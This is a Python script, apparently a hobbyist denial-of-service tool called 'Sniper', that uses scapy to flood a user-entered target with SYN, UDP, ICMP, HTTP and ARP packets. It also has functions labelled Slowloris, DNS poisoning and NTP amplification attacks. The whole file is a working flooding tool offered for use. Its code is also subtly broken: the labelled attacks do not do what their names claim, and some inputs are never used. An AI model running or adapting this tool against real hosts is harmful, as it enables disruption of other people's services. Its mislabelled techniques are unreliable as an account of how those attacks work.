import sys
from scapy.all import *
import os
import socket
from urllib.parse import urlparse

ascii_art = """
\033[91m
   _____       _
  / ____|     (_)
 | (___  _ __  _ _ __   ___ _ __
  \___ \| '_ \| | '_ \ / _ \ '__|
  ____) | | | | | |_) |  __/ |
 |_____/|_| |_|_| .__/ \___|_|
                | |
                |_| by JRDP Team  https://github.com/JRDPCN
\033[0m
"""

def get_default_port(url):
    try:
        parsed_url = urlparse(url)
        return parsed_url.port if parsed_url.port else 443 if parsed_url.scheme == "https" else 80
    except ValueError:
        return 80

def get_target_ip(target_url):
    try:
        parsed_url = urlparse(target_url)
        if parsed_url.scheme:
            target_ip = socket.gethostbyname(parsed_url.netloc)
        else:
            target_ip = socket.gethostbyname(target_url)
        return target_ip
    except socket.gaierror:
        print(f"\033[91mError: Unable to resolve host {target_url}\033[0m")
        sys.exit(1)

def send_packets(target_url, packet_type, num_packets, packet_size, port=None):
    successful_packets = 0

    try:
        target_ip = get_target_ip(target_url)
    except Exception as e:
        print(f"\033[91mError: {e}\033[0m")
        sys.exit(1)

    print(f"\033[94mSending packets to {target_url} \033[37m({target_ip})\033[0m\033[0m")

    for i in range(int(num_packets)):
        try:
            if packet_type == 1:
                http_request = f"GET / HTTP/1.1\r\nHost: {target_url}\r\n\r\n"
                packet = IP(dst=target_ip)/TCP(dport=port, sport=RandShort())/Raw(load=http_request.encode())
            elif packet_type == 2:
                packet = IP(dst=target_ip)/UDP(dport=port)/DNS(rd=1, qd=DNSQR(qname="example.com"))
            elif packet_type == 3:
                packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
            elif packet_type == 4:
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            elif packet_type == 5:
                http_post_request = f"POST / HTTP/1.1\r\nHost: {target_url}\r\n\r\n"
                packet = IP(dst=target_ip)/TCP(dport=port, sport=RandShort())/Raw(load=http_post_request.encode())
            elif packet_type == 6:
                packet = IP(dst=target_ip)/ICMP()
            elif packet_type == 7:
                packet = IP(dst=target_ip)/UDP(dport=port)
            elif packet_type == 8:
                slowloris_attack(target_url, num_packets, port)
            elif packet_type == 9:
                dns_poisoning_attack(target_url, num_packets, port)
            elif packet_type == 10:
                ntp_amplification_attack(target_url, num_packets, port)
            else:
                print(f"\033[91mInvalid packet type: {packet_type}\033[0m")
                return

            send(packet, verbose=0)
            successful_packets += 1
            print(f"\033[94mPACKET NR.{i + 1} to {target_url} \033[37m({target_ip})\033[0m \033[0m\033[92mSUCCESS\033[0m")

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"An error occurred: {e}")

    print(f"\n\033[92mSuccessfully sent {successful_packets}/{num_packets} packets.\033[0m")

def slowloris_attack(target_url, num_connections, port=None):
    try:
        target_ip = get_target_ip(target_url)
    except Exception as e:
        print(f"\033[91mError: {e}\033[0m")
        sys.exit(1)

    print(f"\033[94mPerforming Slowloris Attack on {target_url} \033[37m({target_ip})\033[0m\033[0m")

    for _ in range(int(num_connections)):
        try:
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=0)
            print(f"\033[94mConnection established to {target_url} \033[37m({target_ip})\033[0m \033[0m\033[92mSUCCESS\033[0m")

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"An error occurred: {e}")

    print(f"\n\033[92mSlowloris Attack completed.\033[0m")

def dns_poisoning_attack(target_url, num_packets, port=None):
    try:
        target_ip = get_target_ip(target_url)
    except Exception as e:
        print(f"\033[91mError: {e}\033[0m")
        sys.exit(1)

    print(f"\033[94mPerforming DNS Poisoning Attack on {target_url} \033[37m({target_ip})\033[0m\033[0m")

    for _ in range(int(num_packets)):
        try:
            packet = IP(dst=target_ip)/UDP(dport=port)/DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(packet, verbose=0)
            print(f"\033[94mDNS Poisoning packet sent to {target_url} \033[37m({target_ip})\033[0m \033[0m\033[92mSUCCESS\033[0m")

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"An error occurred: {e}")

    print(f"\n\033[92mDNS Poisoning Attack completed.\033[0m")

def ntp_amplification_attack(target_url, num_packets, port=None):
    try:
        target_ip = get_target_ip(target_url)
    except Exception as e:
        print(f"\033[91mError: {e}\033[0m")
        sys.exit(1)

    print(f"\033[94mPerforming NTP Amplification Attack on {target_url} \033[37m({target_ip})\033[0m\033[0m")

    for _ in range(int(num_packets)):
        try:
            packet = IP(dst=target_ip)/UDP(dport=port)/NTP()
            send(packet, verbose=0)
            print(f"\033[94mNTP Amplification packet sent to {target_url} \033[37m({target_ip})\033[0m \033[0m\033[92mSUCCESS\033[0m")

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"An error occurred: {e}")

    print(f"\n\033[92mNTP Amplification Attack completed.\033[0m")

if __name__ == "__main__":
    os.system('clear')
    print(ascii_art)
    target_url = input("\033[95mEnter URL or IP: \033[0m")

    default_port = get_default_port(target_url)
    print(f"\033[94mDefault port for {target_url}: {default_port}\033[0m")

    print("\033[94m1.HTTP GET\n2.DNS Request\n3.ARP Request\n 4. SYN Flood\n5. HTTP POST\n6. ICMP Echo Request\n7. UDP Flood\n8. Slowloris Attack\n9. DNS Poisoning Attack\n10. NTP Amplification Attack\033[0m")
    packet_type = int(input("\033[95mSelect packet type: \033[0m"))
    
    num_packets = input("\033[95mEnter amount of packets: \033[0m")
    if packet_type in [3, 4, 11]:
        packet_size = input("\033[95mEnter size of packets (in KB) for TCP (use 0 for unlimited size): \033[0m")
    else:
        packet_size = None

    try:
        send_packets(target_url, packet_type, num_packets, packet_size, default_port)
    except Exception as e:
        print(f"An error occurred: {e}")
